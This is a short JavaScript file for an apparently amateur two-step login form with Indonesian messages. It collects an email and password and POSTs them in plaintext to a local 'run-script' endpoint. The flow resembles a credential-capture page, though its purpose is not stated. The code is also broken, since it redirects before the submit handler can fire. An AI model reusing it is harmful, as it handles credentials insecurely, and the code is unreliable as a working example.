
document.getElementById('next-button').addEventListener('click', function () {
    const emailInput = document.getElementById('email').value;
    
    if (emailInput) {
        document.getElementById('email').style.display = 'none';
        document.getElementById('next-button').style.display = 'none';
        document.getElementById('password').style.display = 'block';
        document.getElementById('login-button').style.display = 'block';
    }
});

document.getElementById('login-button').addEventListener('click', function () {
    const passwordInput = document.getElementById('password').value;

    if (passwordInput) {
        document.getElementById('submit').addEventListener('click', async function () {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (email && password) {
                try {
                    const response = await fetch("http://localhost:5000/run-script", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ email, password })
                    });
        
                    const data = await response.json();
                    alert(data.message); 
        
                } catch (error) {
                    alert("Gagal mengirim data.");
                    console.error(error);
                }
            }
        });
        
        window.location.href = 'next-page.html';
    }
});